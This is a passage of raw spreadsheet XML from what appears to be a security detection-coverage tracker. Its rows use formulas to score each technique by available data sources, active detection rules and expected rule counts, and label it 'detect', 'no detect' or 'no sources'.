      <c r="U639" t="s">
        <v>2905</v>
      </c>
      <c r="V639" t="s">
        <v>2906</v>
      </c>
      <c r="W639" t="b">
        <v>1</v>
      </c>
      <c r="X639" t="s">
        <v>2900</v>
      </c>
    </row>
    <row r="640" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A640" t="s">
        <v>2907</v>
      </c>
      <c r="B640" t="s">
        <v>2907</v>
      </c>
      <c r="C640" t="s">
        <v>154</v>
      </c>
      <c r="D640" t="s">
        <v>8</v>
      </c>
      <c r="E640" t="s">
        <v>2908</v>
      </c>
      <c r="F640" s="9">
        <f t="shared" si="10"/>
        <v>5</v>
      </c>
      <c r="G640" s="9" cm="1">
        <f t="array" ref="G640">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H640" s="9" cm="1">
        <f t="array" ref="H640">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I640" s="9" t="str" cm="1">
        <f t="array" ref="I640">IF(SUM(IF($C640=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C640=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J640" s="9" t="str" cm="1">
        <f t="array" ref="J64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40" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M640" s="9" cm="1">
        <f t="array" ref="M640">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N640" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O640" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P640" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S64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40" t="s">
        <v>386</v>
      </c>
      <c r="U640" t="s">
        <v>2909</v>
      </c>
      <c r="V640" t="s">
        <v>2910</v>
      </c>
      <c r="W640" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="641" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A641" t="s">
        <v>2911</v>
      </c>
      <c r="B641" t="s">
        <v>2911</v>
      </c>
      <c r="C641" t="s">
        <v>96</v>
      </c>
      <c r="D641" t="s">
        <v>8</v>
      </c>
      <c r="E641" t="s">
        <v>2912</v>
      </c>
      <c r="F641" s="9">
        <f t="shared" si="10"/>
        <v>2</v>
      </c>
      <c r="G641" s="9" cm="1">
        <f t="array" ref="G641">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H641" s="9" cm="1">
        <f t="array" ref="H641">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I641" s="9" t="str" cm="1">
        <f t="array" ref="I641">IF(SUM(IF($C641=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C641=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J641" s="9" t="str" cm="1">
        <f t="array" ref="J64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41" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M641" s="9" cm="1">
        <f t="array" ref="M641">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N641" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O641" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P641" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S64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41" t="s">
        <v>520</v>
      </c>
      <c r="U641" t="s">
        <v>2913</v>
      </c>
      <c r="V641" t="s">
        <v>2914</v>
      </c>
      <c r="W641" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="642" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A642" t="s">
        <v>2915</v>
      </c>
      <c r="B642" t="s">
        <v>2915</v>
      </c>
      <c r="C642" t="s">
        <v>203</v>
      </c>
      <c r="D642" t="s">
        <v>6</v>
      </c>
      <c r="E642" t="s">
        <v>2916</v>
      </c>
      <c r="F642" s="9">
        <f t="shared" si="10"/>
        <v>3</v>
      </c>
      <c r="G642" s="9" cm="1">
        <f t="array" ref="G642">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H642" s="9" cm="1">
        <f t="array" ref="H642">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I642" s="9" t="str" cm="1">
        <f t="array" ref="I642">IF(SUM(IF($C642=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C642=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J642" s="9" t="str" cm="1">
        <f t="array" ref="J64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42" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M642" s="9" cm="1">
        <f t="array" ref="M642">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N642" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O642" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P642" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S64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42" t="s">
        <v>368</v>
      </c>
      <c r="U642" t="s">
        <v>2917</v>
      </c>
      <c r="V642" t="s">
        <v>2918</v>
      </c>
      <c r="W642" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="643" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A643" t="s">
        <v>2919</v>
      </c>
      <c r="B643" t="s">
        <v>2919</v>
      </c>
      <c r="C643" t="s">
        <v>130</v>
      </c>
      <c r="D643" t="s">
        <v>7</v>
      </c>
      <c r="E643" t="s">
        <v>2920</v>
      </c>
      <c r="F643" s="9">
        <f t="shared" si="10"/>
        <v>4</v>
      </c>
      <c r="G643" s="9" cm="1">
        <f t="array" ref="G643">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H643" s="9" cm="1">
        <f t="array" ref="H643">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I643" s="9" t="str" cm="1">
        <f t="array" ref="I643">IF(SUM(IF($C643=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C643=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J643" s="9" t="str" cm="1">
        <f t="array" ref="J64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43" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M643" s="9" cm="1">
        <f t="array" ref="M643">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N643" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O643" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P643" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S64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43" t="s">
        <v>1010</v>
      </c>
      <c r="U643" t="s">
        <v>2921</v>
      </c>
      <c r="V643" t="s">
        <v>2922</v>
      </c>
      <c r="W643" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="644" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A644" t="s">
        <v>2923</v>
      </c>
      <c r="B644" t="s">
        <v>2923</v>
      </c>
      <c r="C644" t="s">
        <v>68</v>
      </c>
      <c r="D644" t="s">
        <v>1590</v>
      </c>
      <c r="E644" t="s">
        <v>2924</v>
      </c>
      <c r="F644" s="9">
        <f t="shared" si="10"/>
        <v>4</v>
      </c>
      <c r="G644" s="9" cm="1">
        <f t="array" ref="G644">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H644" s="9" cm="1">
        <f t="array" ref="H644">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I644" s="9" t="str" cm="1">
        <f t="array" ref="I644">IF(SUM(IF($C644=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C644=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J644" s="9" t="str" cm="1">
        <f t="array" ref="J64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44" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M644" s="9" cm="1">
        <f t="array" ref="M644">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N644" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O644" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P644" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S64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44" t="s">
        <v>368</v>
      </c>
      <c r="U644" t="s">
        <v>2925</v>
      </c>
      <c r="V644" t="s">
        <v>2926</v>
      </c>
      <c r="W644" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="645" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A645" t="s">
        <v>2927</v>
      </c>
      <c r="B645" t="s">
        <v>2927</v>
      </c>
      <c r="C645" t="s">
        <v>199</v>
      </c>
      <c r="D645" t="s">
        <v>6</v>
      </c>
      <c r="E645" t="s">
        <v>1078</v>
      </c>
      <c r="F645" s="9">
        <f t="shared" si="10"/>
        <v>3</v>
      </c>
      <c r="G645" s="9" cm="1">
        <f t="array" ref="G645">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H645" s="9" cm="1">
        <f t="array" ref="H645">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I645" s="9" t="str" cm="1">
        <f t="array" ref="I645">IF(SUM(IF($C645=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C645=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J645" s="9" t="str" cm="1">
        <f t="array" ref="J64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45" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M645" s="9" cm="1">
        <f t="array" ref="M645">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N645" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O645" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P645" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S64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45" t="s">
        <v>658</v>
      </c>
      <c r="U645" t="s">
        <v>2928</v>
      </c>
      <c r="V645" t="s">
        <v>2929</v>
      </c>
      <c r="W645" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="646" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A646" t="s">
        <v>2930</v>
      </c>
      <c r="B646" t="s">
        <v>2930</v>
      </c>
      <c r="C646" t="s">
        <v>117</v>
      </c>
      <c r="D646" t="s">
        <v>3</v>
      </c>
      <c r="E646" t="s">
        <v>1587</v>
      </c>
      <c r="F646" s="9">
        <f t="shared" si="10"/>
        <v>2</v>
      </c>
      <c r="G646" s="9" cm="1">
        <f t="array" ref="G646">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H646" s="9" cm="1">
        <f t="array" ref="H646">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I646" s="9" t="str" cm="1">
        <f t="array" ref="I646">IF(SUM(IF($C646=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C646=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J646" s="9" t="str" cm="1">
        <f t="array" ref="J64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46" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M646" s="9" cm="1">
        <f t="array" ref="M646">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N646" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O646" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P646" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S64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46" t="s">
        <v>1690</v>
      </c>
      <c r="U646" t="s">
        <v>2931</v>
      </c>
      <c r="W646" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="647" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A647" t="s">
        <v>2932</v>
      </c>
      <c r="B647" t="s">
        <v>2932</v>
      </c>
      <c r="C647" t="s">
        <v>167</v>
      </c>
      <c r="D647" t="s">
        <v>7</v>
      </c>
      <c r="E647" t="s">
        <v>2933</v>
      </c>
      <c r="F647" s="9">
        <f t="shared" si="10"/>
        <v>7</v>
      </c>
      <c r="G647" s="9" cm="1">
        <f t="array" ref="G647">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H647" s="9" cm="1">
        <f t="array" ref="H647">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I647" s="9" t="str" cm="1">
        <f t="array" ref="I647">IF(SUM(IF($C647=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C647=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J647" s="9" t="str" cm="1">
        <f t="array" ref="J64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47" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M647" s="9" cm="1">
        <f t="array" ref="M647">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N647" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O647" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P647" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S64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47" t="s">
        <v>1287</v>
      </c>
      <c r="U647" t="s">
        <v>2934</v>
      </c>
      <c r="W647" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="648" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A648" t="s">
        <v>2935</v>
      </c>
      <c r="B648" t="s">
        <v>2935</v>
      </c>
      <c r="C648" t="s">
        <v>15</v>
      </c>
      <c r="D648" t="s">
        <v>1</v>
      </c>
      <c r="F648" s="9">
        <f t="shared" si="10"/>
        <v>1</v>
      </c>
      <c r="G648" s="9" cm="1">
        <f t="array" ref="G648">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H648" s="9" cm="1">
        <f t="array" ref="H648">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I648" s="9" t="str" cm="1">
        <f t="array" ref="I648">IF(SUM(IF($C648=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C648=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J648" s="9" t="str" cm="1">
        <f t="array" ref="J648">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48" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M648" s="9" cm="1">
        <f t="array" ref="M648">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N648" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O648" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P648" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S648"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48" t="s">
        <v>2513</v>
      </c>
      <c r="U648" t="s">
        <v>2936</v>
      </c>
      <c r="V648" t="s">
        <v>2937</v>
      </c>
      <c r="W648" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="649" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A649" t="s">
        <v>2938</v>
      </c>
      <c r="B649" t="s">
        <v>2938</v>
      </c>
      <c r="C649" t="s">
        <v>17</v>
      </c>
      <c r="D649" t="s">
        <v>3</v>
      </c>
      <c r="E649" t="s">
        <v>815</v>
      </c>
      <c r="F649" s="9">
        <f t="shared" si="10"/>
        <v>3</v>
      </c>
      <c r="G649" s="9" cm="1">
        <f t="array" ref="G649">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H649" s="9" cm="1">
        <f t="array" ref="H649">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I649" s="9" t="str" cm="1">
        <f t="array" ref="I649">IF(SUM(IF($C649=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C649=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J649" s="9" t="str" cm="1">
        <f t="array" ref="J649">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49" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
